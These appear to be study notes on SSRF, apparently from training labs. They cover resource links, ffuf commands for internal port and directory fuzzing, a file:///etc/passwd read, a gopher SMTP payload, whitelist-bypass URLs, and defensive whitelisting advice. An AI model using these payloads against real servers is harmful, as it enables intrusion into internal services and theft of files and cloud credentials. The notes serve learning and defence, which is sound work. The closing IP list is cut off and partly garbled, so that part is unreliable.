# __OVERVIEW

Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf. By exploiting this vulnerability An attacker might be able to:

- Access Internal services
- Leak Cloud metadata
- read local files on the server
- Perform network discovery and port scanning

Below, i’ll share top tier free resources and guides to help you understand SSRF better.

## Resources

1. [Server-Side Request Forgery (SSRF) blog post by integriti](https://www.intigriti.com/researchers/hackademy/server-side-request-forgery-ssrf)  
    A beginner friendly introduction to SSRF and explanations with examples
    
2. [SSRF In the wild by vickelee:](https://vickieli.dev/ssrf/ssrf-in-the-wild/)  
    explores recent SSRF vulnerability reports and identifies the common coding patterns and testing techniques associated with them. I also highly recommend her SSRF series including [bypassing SSRF protections](https://vickieli.dev/ssrf/bypassing-ssrf-protection/)
    
3. [PayloadsAllTheThings Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#tools):  
    your essential playbook for SSRF exploitation, including bypass techniques and payloads.
    
4. [blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains):  
    A Collection of blind SSRF attack chains for different cloud providers and services.
    
5. [Portswigger labs](https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf)

---
## Exploitation Techniques

### Port Scanning

methodology:

Identify any error messages by inspecting discrepancies between server responses. looking for Error messages and comparing requests could clue us on which ports are open.

generate port numbers

```shell-session
 seq 1 10000 > ports.txt
```

Afterward, we can fuzz all open ports by filtering out responses containing the error message we have identified earlier.

```shell-session
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

### Directory Fuzzing

Accessing Internal websites and performing a directory bruteforce on them:

```shell-session
$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

### Local File Disclosure

if file scheme is allowed, we can read files on the system, including the web application's source code.

```
file:///etc/passwd
```

### Leaking Cloud metadata

1. [SSRF to AWS Metadata Exposure: How Attackers Steal Cloud Credentials](https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials)

2. [(payloads) SSRF URL for Cloud Instances](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md)

## Other URL Schemes

### Gopher Scheme
Secondary requests can be embedded into the vulnerable parameter. For example, if you were able to access a restricted endpoint by exploiting an SSRF vulnerability:
```shell-session
$ python2.7 gopherus.py --exploit smtp


Give Details to send mail:

Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
Subject :  HelloWorld
Message :  Hello from SSRF!

Your gopher link is ready to send Mail:

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.

-----------Made-by-SpyD3r-----------
```

## Protections

[OWASP SSRF Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

### safe whitelisting

- **check domain**
- **Resolve DNS**
- **Block private / loopback / link-local IPs**
- **Repeat checks after redirects**
- **Centralize all outbound requests**

 Weak Whitelisting:
```
Allow any URL that CONTAINS example.com
Includes `example.com` without IP validation
Allow example.com but follow redirects freely
Allow example.com but trust DNS blindly

# bypasses:
http://example.com@localhost
http://example.com.evil.com
http://example.com -> 302 -> http://127.0.0.1
example.com DNS rebinding to 127.0.0.1
```

---
## DNS Rebinding
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DNS%20Rebinding
rebind site: https://lock.cmpxchg8b.com/rebinder.html



## IPs

1.localhost, 0.0.0.0
2. loopback: 127.0.0.1 1277, hex, []::1,